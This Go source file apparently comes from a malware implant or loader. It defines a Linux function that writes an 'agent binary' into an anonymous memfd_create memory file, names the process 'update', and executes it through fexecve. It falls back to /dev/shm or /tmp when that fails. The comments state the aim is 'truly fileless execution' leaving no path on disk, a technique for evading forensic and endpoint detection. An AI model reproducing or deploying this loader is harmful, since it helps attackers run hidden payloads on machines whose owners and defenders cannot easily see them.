//go:build linux

package main

import (
	"os"
	"unsafe"

	"golang.org/x/sys/unix"
)

// execLinux uses memfd_create for truly fileless execution on Linux.
// The agent binary lives only in an anonymous memory file — no path on disk.
func execLinux(data []byte) {
	// Create anonymous in-memory file
	fd, _, errno := unix.Syscall(unix.SYS_MEMFD_CREATE,
		uintptr(unsafe.Pointer(&[]byte("update\x00")[0])),
		1, // MFD_CLOEXEC
		0,
	)
	if errno != 0 {
		// Fallback to /dev/shm or /tmp
		execTempFile(data)
		return
	}

	memFd := int(fd)
	f := os.NewFile(uintptr(memFd), "memfd")
	if _, err := f.Write(data); err != nil {
		f.Close()
		execTempFile(data)
		return
	}

	// fexecve: execute from the file descriptor (no path needed)
	args := []string{"update"}
	env := os.Environ()
	if err := unix.Fexecve(memFd, args, env); err != nil {
		f.Close()
		execTempFile(data)
	}
}
